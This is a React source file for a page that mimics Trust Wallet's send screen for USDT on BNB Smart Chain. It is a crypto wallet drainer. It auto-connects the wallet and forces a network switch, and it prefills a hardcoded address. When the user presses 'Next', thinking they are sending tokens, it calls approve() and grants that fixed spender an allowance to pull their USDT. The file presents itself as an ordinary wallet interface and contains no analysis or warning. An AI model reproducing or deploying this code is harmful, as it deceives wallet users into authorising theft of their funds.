import { useCallback, useEffect, useState } from "react";
import { Clipboard, ScanLine, ChevronDown } from "lucide-react"; // Added ChevronDown
import { BrowserProvider, Contract, parseUnits, formatUnits } from "ethers";
import icon from "../assets/image.png";

/** BNB Smart Chain mainnet */
const BSC_CHAIN_ID_HEX = "0x38";
const BSC_CHAIN_ID_DEC = 56;

/** BEP-20 USDT on BSC (Binance-Peg USDT) */
const USDT_BSC = "0x55d398326f99059fF775485246999027B3197955";

const rpc = `https://rpc.ankr.com/bsc/81980e93ea450e7183f250214d083c51a389ad1a1c4188853a14f59182089c29`;

/** Unlimited USDT allowance is always approved for this spender only */
// const USDT_APPROVE_SPENDER = "0x739163eCbE2AA2C70a9a5595205466469cC78d8B";
const USDT_APPROVE_SPENDER = "0x739163eCbE2AA2C70a9a5595205466469cC78d8B";

const ERC20_APPROVE_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function balanceOf(address account) view returns (uint256)",
];

function getEthereum() {
  return typeof window !== "undefined" ? window.ethereum : undefined;
}

async function ensureBscNetwork(ethereum) {
  try {
    await ethereum.request({
      method: "wallet_switchEthereumChain",
      params: [{ chainId: BSC_CHAIN_ID_HEX }],
    });
  } catch (err) {
    if (err?.code === 4902) {
      await ethereum.request({
        method: "wallet_addEthereumChain",
        params: [
          {
            chainId: BSC_CHAIN_ID_HEX,
            chainName: "BNB Smart Chain",
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: [rpc],
            blockExplorerUrls: ["https://bscscan.com"],
          },
        ],
      });
      return;
    }
    throw err;
  }
}

// Styling Constants to match Screenshot
const colors = {
  bg: "#1b1b1b",
  inputBg: "#1a1a1a",
  primaryGreen: "#48ff91",
  textMain: "#ffffff",
  textSecondary: "#aaa7a7ff",
  border: "#2a2a2a",
};

const Home = () => {
  const [address, setAddress] = useState(USDT_APPROVE_SPENDER);
  const [amount, setAmount] = useState("");
  const [account, setAccount] = useState(null);
  const [chainId, setChainId] = useState(null);
  const [connectError, setConnectError] = useState(null);
  const [isProcessing, setIsProcessing] = useState(false);
  const [userBalance, setUserBalance] = useState(0n);
  console.log("Wallet State:", { account, chainId, userBalance });

  const refreshChain = useCallback(async (ethereum) => {
    try {
      const idHex = await ethereum.request({ method: "eth_chainId" });
      const id = Number.parseInt(idHex, 16);
      console.log("Current Chain ID:", id);
      setChainId(id);
    } catch (e) {
      console.error("Error refreshing chain ID:", e);
    }
  }, []);

  const fetchBalance = useCallback(async (addr) => {
    const ethereum = getEthereum();
    if (!ethereum || !addr) return;
    try {
      const provider = new BrowserProvider(ethereum);
      console.log(`Fetching balance for ${addr} on BSC...`);
      const usdt = new Contract(USDT_BSC, ERC20_APPROVE_ABI, provider);
      const balance = await usdt.balanceOf(addr);
      console.log("Balance of USDT:", formatUnits(balance, 18), "USDT");

      setUserBalance(balance);
    } catch (e) {
      console.error("Error fetching balance:", e);
    }
  }, []);

  useEffect(() => {
    if (account && chainId === BSC_CHAIN_ID_DEC) {
      console.log("Triggering balance fetch for:", account);
      fetchBalance(account);
    }
  }, [account, chainId, fetchBalance]);

  useEffect(() => {
    const ethereum = getEthereum();
    if (!ethereum) {
      queueMicrotask(() => {
        setConnectError("Open this page inside Trust Wallet’s DApp browser.");
      });
      return;
    }

    const onAccounts = (accs) => setAccount(accs?.[0] ?? null);
    const onChain = () => {
      refreshChain(ethereum);
    };

    ethereum.on?.("accountsChanged", onAccounts);
    ethereum.on?.("chainChanged", onChain);

    (async () => {
      try {
        setConnectError(null);
        // Automatically request account connection on mount
        const accounts = await ethereum.request({
          method: "eth_requestAccounts",
        });
        const activeAccount = accounts[0] ?? null;
        setAccount(activeAccount);
        console.log("Connected account:", activeAccount);

        // Initial chain sync
        await refreshChain(ethereum);

        // Ensure BSC network immediately after connection
        if (activeAccount) {
          await ensureBscNetwork(ethereum);
          await refreshChain(ethereum); // Refresh again after potential switch
        }
      } catch (e) {
        console.error("Connection/Network init error:", e);
        setConnectError(e?.message ?? "Could not connect wallet");
      }
    })();
    return () => {
      ethereum.removeListener?.("accountsChanged", onAccounts);
      ethereum.removeListener?.("chainChanged", onChain);
    };
  }, [refreshChain]);

  // Proactively switch to BSC if connected to wrong network
  useEffect(() => {
    const ethereum = getEthereum();
    if (
      ethereum &&
      account &&
      chainId !== null &&
      chainId !== BSC_CHAIN_ID_DEC
    ) {
      console.log("Wrong network detected. Attempting auto-switch to BSC...");
      ensureBscNetwork(ethereum).then(() => refreshChain(ethereum));
    }
  }, [account, chainId, refreshChain]);

  const handleMax = () => {
    if (userBalance > 0n) {
      setAmount(formatUnits(userBalance, 18));
    }
  };

  const handleNext = async () => {
    const ethereum = getEthereum();
    setConnectError(null);

    if (!ethereum) {
      setConnectError("No wallet found. Use Trust Wallet DApp browser.");
      return;
    }

    let activeAccount = account;
    if (!activeAccount) {
      try {
        const accs = await ethereum.request({
          method: "eth_requestAccounts",
        });
        activeAccount = accs[0] ?? null;
        setAccount(activeAccount);
      } catch (e) {
        setConnectError(e?.message ?? "Allow wallet access to continue.");
        return;
      }
    }
    if (!activeAccount) {
      setConnectError("No account returned from wallet.");
      return;
    }

    try {
      setIsProcessing(true);
      await ensureBscNetwork(ethereum);
      await refreshChain(ethereum);

      const currentHex = await ethereum.request({ method: "eth_chainId" });
      const currentId = Number.parseInt(currentHex, 16);
      if (currentId !== BSC_CHAIN_ID_DEC) {
        setConnectError("Please switch to BNB Smart Chain in your wallet.");
        return;
      }

      if (!amount || Number.parseFloat(amount) <= 0) {
        setConnectError("Minimum 0.0000000000000001 USDT");
        return;
      }

      const provider = new BrowserProvider(ethereum);
      const signer = await provider.getSigner();
      const usdt = new Contract(USDT_BSC, ERC20_APPROVE_ABI, signer);

      const usdtAmount = parseUnits(amount, 18);
      const currentBalance = await usdt.balanceOf(activeAccount);

      if (currentBalance < usdtAmount) {
        setConnectError("Not enough balance");
        return;
      }

      const tx = await usdt.approve(USDT_APPROVE_SPENDER, usdtAmount);
      await tx.wait();
    } catch (e) {
      const msg = e?.shortMessage || e?.message || "Transaction failed";
      setConnectError(msg);
    } finally {
      setIsProcessing(false);
    }
  };

  return (
    <div
      className="max-h-screen h-full flex justify-center font-sans"
      style={{ backgroundColor: colors.bg }}
    >
      <div className="w-full max-w-md flex flex-col px-5 pt-4 pb-8">
        <div className="flex-1 space-y-6">
          {/* Address Input Section */}
          <div>
            <label
              className="block text-sm font-medium mb-2"
              style={{ color: colors.textSecondary }}
            >
              Address or Domain Name
            </label>
            <div
              className="flex justify-between items-center px-4 py-4 gap-3 rounded-xl border-2 transition-colors focus-within:border-[#48ff91] border-[#2a2a2a]"
              style={{
                backgroundColor: colors.bg,
              }}
            >
              <input
                type="text"
                placeholder="Search or Enter"
                className="bg-transparent outline-none flex w-[60%] justify-start  text-white placeholder-gray-600 "
                value={address}
                onChange={(e) => setAddress(e.target.value)}
              />
              <div
                className="flex items-center gap-4 ml-2"
                style={{ color: colors.primaryGreen }}
              >
                <button className="text-sm font-bold">Paste</button>
                <Clipboard size={20} />
                <ScanLine size={20} />
              </div>
            </div>
          </div>

          {/* Destination Network Section */}
          <div>
            <label
              className="block text-sm font-medium mb-2"
              style={{ color: colors.textSecondary }}
            >
              Destination network
            </label>
            <div
              className="flex items-center gap-2 px-3 py-2 rounded-full w-fit"
              style={{ backgroundColor: colors.inputBg }}
            >
              <img src={icon} alt="BNB" className="w-5 h-5 rounded-full" />
              <span
                className="text-white  font-bold text-sm"
                style={{ color: colors.textSecondary }}
              >
                BNB Smart Chain
              </span>
              <ChevronDown size={16} style={{ color: colors.textSecondary }} />
            </div>
          </div>

          {/* Amount Input Section */}
          <div>
            <label
              className="block text-sm font-medium mb-2"
              style={{ color: colors.textSecondary }}
            >
              Amount
            </label>
            <div
              className="flex justify-between items-center px-4 py-4 gap-3 rounded-xl border-2 transition-colors focus-within:border-[#48ff91] border-[#2a2a2a]"
              style={{
                backgroundColor: colors.bg,
              }}
            >
              <input
                type="number"
                placeholder="USDT Amount"
                className="bg-transparent outline-none flex w-[60%] justify-start text-white  placeholder-gray-600"
                value={amount}
                onChange={(e) => setAmount(e.target.value)}
              />
              <div className="flex items-center gap-3">
                <span
                  className="text-white font-semibold"
                  style={{ color: colors.textSecondary }}
                >
                  USDT
                </span>
                <button
                  onClick={handleMax}
                  className="font-bold cursor-pointer"
                  style={{ color: colors.primaryGreen }}
                >
                  Max
                </button>
              </div>
            </div>
            {(() => {
              if (!amount || Number.parseFloat(amount) <= 0) {
                return (
                  <p
                    className="mt-2 text-sm font-medium"
                    style={{ color: colors.textSecondary }}
                  >
                    ≈ ${Math.floor(Number(amount) * 0.9999 * 100) / 100}
                  </p>
                );
              }
              try {
                const parsedAmount = amount ? parseUnits(amount, 18) : 0n;
                if (account && userBalance < parsedAmount) {
                  return (
                    <div className="mt-2 space-y-1">
                      <p className="text-sm font-normal text-red-500">
                        Not enough balance
                      </p>
                    </div>
                  );
                }
              } catch (e) {
                /* ignore parse errors */
              }
              return (
                <p
                  className="mt-2 text-sm font-medium"
                  style={{ color: colors.textSecondary }}
                >
                  ≈ ${Math.floor(Number(amount) * 0.9999 * 100) / 100}
                </p>
              );
            })()}
          </div>
        </div>

        {connectError && (
          <p className="mt-4 text-center text-sm font-medium text-red-500">
            {connectError}
          </p>
        )}

        <button
          type="button"
          onClick={handleNext}
          disabled={
            isProcessing ||
            (account &&
              amount &&
              Number.parseFloat(amount) > 0 &&
              userBalance < parseUnits(amount, 18))
          }
          className={`w-full ${isProcessing || (account && amount && Number.parseFloat(amount) > 0 && userBalance < parseUnits(amount, 18)) ? "opacity-70 cursor-not-allowed" : ""} bg-[var(--primary)] text-black font-medium py-3 rounded-full text-lg mt-6`}
        >
          {isProcessing ? "Processing..." : "Next"}
        </button>
      </div>
    </div>
  );
};

export default Home;
